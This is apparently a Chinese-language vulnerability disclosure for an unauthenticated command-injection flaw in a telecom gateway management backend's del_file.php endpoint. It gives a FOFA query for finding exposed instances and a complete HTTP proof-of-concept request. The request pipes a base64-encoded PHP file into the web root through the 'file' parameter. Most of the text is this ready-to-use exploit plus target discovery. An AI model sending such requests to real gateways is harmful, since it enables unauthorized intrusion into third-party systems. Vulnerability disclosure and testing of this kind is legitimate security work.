## 电信网关配置管理后台del_file.php接口存在命令执行漏洞

电信网关配置管理系统/manager/newtpl/del_file.php接口存在命令执行漏洞,未经身份验证的远程攻击者利用漏洞获取系统权限。

## fofa

```
body="img/login_bg3.png" && body="系统登录"
```

## poc

```
GET /manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgZWNobyBtZDUoJzEyMzQ1NicpO3VubGluayhfX0ZJTEVfXyk7Pz4%3D%20%7C%20base64%20-d%20%3E%201.php HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

![image-20240613144014837](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406131440897.png)

![image-20240613144024431](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406131440485.png)